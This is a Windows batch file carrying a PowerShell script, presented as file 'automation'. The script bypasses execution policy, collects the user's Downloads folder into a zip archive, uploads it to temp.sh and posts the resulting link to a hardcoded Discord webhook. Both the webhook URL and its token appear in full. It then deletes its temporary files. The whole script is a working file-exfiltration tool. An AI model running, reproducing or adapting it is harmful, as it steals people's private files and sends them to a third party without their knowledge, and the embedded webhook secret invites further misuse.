@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$P=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'),'Downloads');" ^
"$A=[System.IO.Path]::Combine((Get-Location).Path, 'temp.sh');" ^
"$M=20971520;" ^
"$T=New-Item -Path (Get-TempPath) -Name 'TmpZipSource' -ItemType Directory -force;" ^
^
"Write-Host '--- STARTING AUTOMATION ---';" ^
"Write-Host \"1. Source: $P\""; ^
"Write-Host \"2. Temp Dir: $T\""; ^
"Write-Host \"3. Max Size: $M bytes (20MB)\""; ^
"Write-Host 'Filtering and copying relevant files... This may take a moment.';"; ^
^
"gci $P -Recurse | Where-Object { $_.PSIsContainer -or ( ($_.Extension -ne '.iso') -and ($_.Length -le $M) ) } | ForEach-Object {" ^
"    $D=$_.FullName -replace [regex]::Escape($P),$T;" ^
"    if($_.PSIsContainer){" ^
"        New-Item -Path $D -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null;" ^
"    } else {" ^
"        [System.IO.Directory]::CreateDirectory((Split-Path $D -Parent)) | Out-Null;" ^
"        Copy-Item $_.FullName $D -Force | Out-Null;" ^
"    }" ^
"}" ^
^
"Write-Host '4. Copy complete. Starting ZIP compression...';" ^
"Compress-Archive -Path \"$T\*\" -DestinationPath $A -CompressionLevel Optimal -Force -ErrorAction Stop;" ^
^
"if(Test-Path $A){" ^
"    Write-Host '5. ZIP file created successfully: temp.sh';" ^
"    $U='https://temp.sh/upload';" ^
"    $W='https://discord.com/api/webhooks/1030265439379914842/5Nz0GeqUVHjh8Qcw8dQXaXbFjE8e59-wDftoJYyhulmfohF7lcYJ1FUGpBrmDJkYzTTp';" ^
"    Write-Host \"6. Starting upload to temp.sh... (Wait for response)\";" ^
"    try {" ^
"        $L=(Invoke-RestMethod -Uri $U -Method POST -Form @{file=(Get-Item $A)}).Trim();" ^
"        if($L -match 'https?://'){" ^
"            Write-Host \"7. Upload successful. Link: $L\";" ^
"            $Payload=@{content=\"FILE UPLOADED: $L\"} | ConvertTo-Json;" ^
"            Write-Host '8. Notifying Discord...';" ^
"            Invoke-RestMethod -Uri $W -Method POST -ContentType 'application/json' -Body $Payload -ErrorAction SilentlyContinue | Out-Null;" ^
"            Write-Host '9. Discord notification sent.';" ^
"        } else {" ^
"            Write-Host \"ERROR: Upload failed or returned an invalid link: $L\";" ^
"        }" ^
"    } catch {" ^
"        Write-Host \"ERROR during Upload/Discord step: $($_.Exception.Message)\";" ^
"    }" ^
"} else {" ^
"    Write-Host 'ERROR: ZIP file was not created (Source directory may be empty).';" ^
"}" ^
^
"Write-Host '10. Cleaning up temporary files...';" ^
"Remove-Item $T -Force -Recurse -ErrorAction SilentlyContinue | Out-Null;" ^
"Remove-Item $A -Force -ErrorAction SilentlyContinue | Out-Null;" ^
"Write-Host '11. Cleanup complete. Job finished.';" ^
"Read-Host 'Press Enter to close this window.'"
